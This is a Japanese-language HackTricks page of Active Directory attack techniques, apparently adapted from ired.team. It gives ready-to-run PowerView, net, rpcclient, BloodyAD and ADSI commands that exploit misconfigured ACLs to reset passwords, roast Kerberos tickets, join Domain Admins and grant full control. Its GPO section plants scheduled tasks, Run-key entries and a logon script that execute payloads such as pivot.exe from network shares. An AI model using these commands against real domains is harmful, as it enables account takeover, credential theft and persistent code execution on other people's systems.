# Active Directory ACLs/ACEs の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **と** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **の手法の概要です。詳細は元の記事を参照してください。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

この権限は攻撃者にターゲットのユーザーアカウントに対する完全なコントロールを与えます。`Get-ObjectAcl` コマンドで `GenericAll` 権限が確認されたら、攻撃者は以下を行えます:

- **ターゲットのパスワードを変更する**: `net user <username> <password> /domain` を使用して、攻撃者はユーザーのパスワードをリセットできます。
- **Targeted Kerberoasting**: ユーザーのアカウントに SPN を割り当てて kerberoastable にし、Rubeus と targetedKerberoast.py を使用して ticket-granting ticket (TGT) のハッシュを抽出し、クラッキングを試みます。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの pre-authentication を無効化し、そのアカウントを ASREPRoasting に対して脆弱にします。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **グループに対する GenericAll 権限**

この権限により、攻撃者は `Domain Admins` のようなグループに対して `GenericAll` 権限を持っている場合、グループのメンバーシップを操作できます。`Get-NetGroup` でグループの識別名を特定した後、攻撃者は次のことができます：

- **自分自身を Domain Admins グループに追加する**: これは直接コマンドで行うか、Active Directory や PowerSploit のようなモジュールを使用して行うことができます。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Linuxからは、BloodyADを利用して、対象グループに対してGenericAll/Writeのメンバーシップを持っている場合に任意のグループに自分を追加することもできます。対象グループが“Remote Management Users”にネストされている場合、そのグループを適用しているホストでは即座にWinRMアクセスを取得します:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

これらの権限をコンピューターオブジェクトやユーザーアカウントに保持していると、以下が可能になります:

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトの乗っ取りが可能になります。
- **Shadow Credentials**: この手法を用いることで、権限を利用して shadow credentials を作成し、コンピューターやユーザーアカウントを偽装できます。

## **WriteProperty on Group**

特定のグループ（例: `Domain Admins`）に対するすべてのオブジェクトに対して `WriteProperty` 権限をユーザーが持っている場合、次のことが可能です:

- **Add Themselves to the Domain Admins Group**: `net user` と `Add-NetGroupUser` コマンドを組み合わせることで実現可能で、この方法はドメイン内での特権昇格を可能にします。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

この特権により、攻撃者はグループのメンバーシップを直接操作するコマンドを使って、`Domain Admins` のような特定のグループに自身を追加できます。次のコマンド列を使用すると自己追加が可能になります:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (自己メンバーシップ)**

似た権限で、攻撃者がそのグループに対して `WriteProperty` 権利を持っている場合、グループのプロパティを変更して自分自身を直接グループに追加することを可能にします。この権限の確認と実行は次の方法で行います:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

ユーザーに対する `ExtendedRight` の `User-Force-Change-Password` を保持していると、現在のパスワードを知らなくてもパスワードをリセットできます。この権利の確認と悪用は PowerShell や代替のコマンドラインツールで行え、対話的セッションや非対話環境向けの one-liners を含む、ユーザーのパスワードをリセットするいくつかの方法が提供されます。コマンドは単純な PowerShell 呼び出しから Linux 上での `rpcclient` の使用まで幅があり、攻撃ベクターの多様性を示しています。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **グループにおける WriteOwner**

攻撃者がグループに対して `WriteOwner` 権限を持っていることを発見した場合、そのグループの所有権を自身に変更できます。これは対象のグループが `Domain Admins` である場合に特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対するより広い制御が可能になります。手順としては、`Get-ObjectAcl` で正しいオブジェクトを特定し、`Set-DomainObjectOwner` を使用して所有者を SID または名前で変更します。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on ユーザー**

この権限により、攻撃者はユーザーの属性を変更できます。具体的には、`GenericWrite`アクセスを持つと、攻撃者はユーザーのログオンスクリプトのパスを変更して、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject`コマンドを使用して対象ユーザーの`scriptpath`プロパティを攻撃者のスクリプトを指すように更新することで実現します。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

この権限があれば、攻撃者は自身や他のユーザーを特定のグループに追加するなど、グループのメンバーシップを操作できます。この手順では、credential object を作成し、それを使ってユーザーをグループに追加または削除し、PowerShell コマンドでメンバーシップの変更を検証します。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

ADオブジェクトを所有し、かつそのオブジェクトに対して `WriteDACL` 権限を持っていると、攻撃者は自身に当該オブジェクトの `GenericAll` 権限を付与できます。これは ADSI 操作によって行われ、オブジェクトの完全な制御やグループメンバーシップの変更を可能にします。とはいえ、Active Directory モジュールの `Set-Acl` / `Get-Acl` コマンドレットを使ってこれらの権限を悪用しようとする場合には制限があります。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **ドメイン上でのレプリケーション (DCSync)**

DCSync攻撃は、ドメイン上の特定のレプリケーション権限を悪用してドメインコントローラを模倣し、ユーザー資格情報を含むデータを同期します。この強力な手法は `DS-Replication-Get-Changes` のような権限を必要とし、攻撃者がドメインコントローラへ直接アクセスしなくてもAD環境から機密情報を抽出できます。 [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPOの委任

Group Policy Objects (GPOs) の管理を委任されたアクセスは重大なセキュリティリスクとなり得ます。例えば、`offense\spotless` のようなユーザーが GPO 管理権限を委任されている場合、**WriteProperty**, **WriteDacl**, **WriteOwner** といった特権を持っている可能性があります。これらの権限は悪用され得ます。PowerView を使って識別する例: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPOの権限列挙

誤設定された GPO を特定するために、PowerSploit の cmdlet を連鎖させることができます。これにより、特定のユーザーが管理権限を持つ GPO を発見できます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピュータ**: どのコンピュータに特定の GPO が適用されているかを解決することで、影響範囲を把握できます。`powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピュータに適用されているポリシー**: 特定のコンピュータにどのポリシーが適用されているかを確認するには、`Get-DomainGPO` のようなコマンドを使用できます。

**特定のポリシーが適用されているOU**: 指定されたポリシーが影響を与えている組織単位 (OU) を特定するには `Get-DomainOU` を使用できます。

GPO を列挙して問題点を見つけるには、ツール [**GPOHound**](https://github.com/cogiceo/GPOHound) も使用できます。

### Abuse GPO - New-GPOImmediateTask

誤設定された GPO はコード実行に悪用される可能性があり、例えば即時の scheduled task を作成することで実行できます。これにより、影響を受けるマシンにユーザーをローカル管理者グループへ追加し、権限を大幅に昇格させることが可能です：
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy moduleがインストールされていると、新しいGPOsの作成とリンク、および影響を受けたコンピュータでbackdoorsを実行するためのregistry valuesなどの設定を行うことができます。この方法は、GPOが更新され、実行のためにユーザがコンピュータにログインする必要があります:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuseは、既存の GPOs にタスクを追加したり設定を変更したりして、新しい GPOs を作成することなく悪用する方法を提供します。  
このツールを使用して変更を適用するには、既存の GPOs を修正するか、RSAT ツールを使用して新しいものを作成する必要があります：
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシーの強制更新

GPOの更新は通常約90分ごとに行われます。このプロセスを迅速化するため、特に変更を実施した直後は、ターゲットコンピュータ上で `gpupdate /force` コマンドを使用して即時にポリシー更新を強制できます。このコマンドにより、次の自動更新サイクルを待たずにGPOへの変更が適用されます。

### 内部の仕組み

特定のGPO、例えば `Misconfigured Policy` のScheduled Tasksを確認すると、`evilTask` のようなタスクが追加されていることが確認できます。これらのタスクは、システムの挙動を変更したり権限を昇格させたりすることを目的としたスクリプトやコマンドラインツールによって作成されます。

タスクの構造は、`New-GPOImmediateTask` によって生成されたXML構成ファイルに示されているように、実行されるコマンドやトリガーを含むスケジュールタスクの詳細を明示しています。このファイルは、GPO内でスケジュールタスクがどのように定義・管理されるかを表しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する手段を提供します。

### ユーザーとグループ

GPOはターゲットシステム上のユーザーやグループのメンバーシップを操作することも可能にします。Users and Groupsのポリシーファイルを直接編集することで、攻撃者はローカルの `administrators` グループのような特権グループにユーザーを追加できます。これはGPO管理権限の委任により可能となり、ポリシーファイルを変更して新しいユーザーを追加したりグループメンバーシップを変更したりすることが許可されます。

Users and Groups用のXML構成ファイルは、これらの変更がどのように実施されるかを示します。このファイルにエントリを追加することで、特定のユーザーに影響を受けるシステム全体で昇格権限を付与できます。この方法はGPO操作を通じた直接的な権限昇格の手段を提供します。

さらに、logon/logoffスクリプトの利用、autoruns用のレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コード実行や永続化のための追加手法も考えられます。これらの手法は、GPOの悪用を通じてアクセスを維持しターゲットシステムを制御するためのさまざまな方法を提供します。

## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
